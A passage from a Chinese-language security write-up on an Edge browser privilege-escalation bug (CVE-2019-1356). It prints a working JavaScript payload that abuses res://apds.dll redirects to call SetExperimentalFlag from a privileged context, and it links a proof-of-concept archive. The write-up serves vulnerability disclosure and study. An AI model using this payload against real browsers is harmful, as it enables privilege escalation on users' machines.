URL，我们可以使用之前使用过的技巧将我们的导航技巧注入到“res:”上下文中。

    
    
    var qpay=escape`history.replaceState("","","res://edgehtml.dll/flags.htm");
    setTimeout(function(){document.write('<iframe src="javascript:top.external.SetExperimentalFlag(/F12ContextMenuEntryPoints/.source, false)">');
    history.pushState('','','res://apds.dll/REDIRECT.HTML?target=javascript:123');history.back();},333);`;
    
    location="res://apds.dll/REDIRECT.HTML?target=javascript:${qpay}";

1.我构造了一个 JS payload，将其导航到
'res://apds.dll/REDIRECT.HTML?target=javascript:{payload}'。这个特定技术是我在 Lokihardt
发布的 Edge 漏洞利用中发现的。

2.payload简单地利用了我们之前讨论过的导航漏洞的相同概念，来提升权限并执行
'top.external.SetExperimentalFlag(/F12ContextMenuEntryPoints/.source,
false)'，它会改变 'about:flags' 中一个设置的值。

3.此时发现权限已提升！

## 4.POC攻击视频

分别是本地文件泄露攻击链方法和权限提升供给链方法,同时这里给出攻击的POC代码和相关文件：<https://leucosite.com/Edge-Local-File-Disclosure-and-EoP/CVE-2019-1356.zip。>

![](./img/8961842708902953454.png)

![](./img/381642939520885322.png)

